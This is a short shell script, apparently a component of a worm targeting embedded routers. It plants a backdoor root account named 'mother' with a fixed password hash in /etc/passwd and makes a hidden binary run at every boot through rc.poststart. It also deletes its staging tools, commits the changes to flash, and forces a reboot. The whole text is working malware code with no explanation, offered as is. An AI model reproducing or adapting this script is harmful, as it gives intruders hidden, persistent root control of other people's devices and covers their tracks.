#!/bin/sh
per=/etc/persistent
grep "mother" /etc/passwd >/dev/null || echo 'mother:$1$J1CHZtqy$n0XDmW4UCVAVYZqFzvoEC/:0:0:Administrator:/etc/persistent:/bin/sh' >> /etc/passwd
grep "f/mother" $per/rc.poststart 2>/dev/null >/dev/null || echo "cd /etc/persistent ; tar -xf mf.tar ; $per/.mf/mother" >> $per/rc.poststart
chmod +x $per/rc.poststart
rm $per/mother
rm $per/download
rm $per/fucker
rm $per/search
rm $per/curl
rm $per/lib*
cfgmtd -w -p /etc/

reboot -n -f >/dev/null &

